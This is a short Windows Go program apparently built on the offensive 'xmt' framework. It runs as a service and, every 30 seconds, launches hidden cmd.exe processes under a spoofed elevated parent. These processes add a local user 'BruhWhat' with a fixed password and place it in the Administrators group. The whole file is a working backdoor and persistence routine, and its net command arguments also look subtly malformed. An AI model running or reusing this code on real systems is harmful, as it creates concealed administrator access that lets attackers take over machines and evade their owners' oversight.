//go:build windows
// +build windows

// Copyright (C) 2021 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//
package main

import (
	"strconv"
	"time"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/device/devtools"
)

const userName = "BruhWhat"

var count = 0

func main() {
	(&devtools.Service{Exec: generate, Interval: time.Second * 30}).Run()
}
func generate() {
	p := cmd.NewProcess("cmd.exe", "/c", "net user "+userName+" "+strconv.Itoa(count)+" HelloThere /add")
	p.Dir = "C:\\"
	p.SetParent(cmd.F().SetElevated(true))
	p.SetWindowDisplay(0)
	p.Run()
	p = cmd.NewProcess("cmd.exe", "/c", "net localgroup Administrators "+userName+" "+strconv.Itoa(count)+" /add")
	p.Dir = "C:\\"
	p.SetParent(cmd.F().SetElevated(true))
	p.SetWindowDisplay(0)
	p.Run()
}
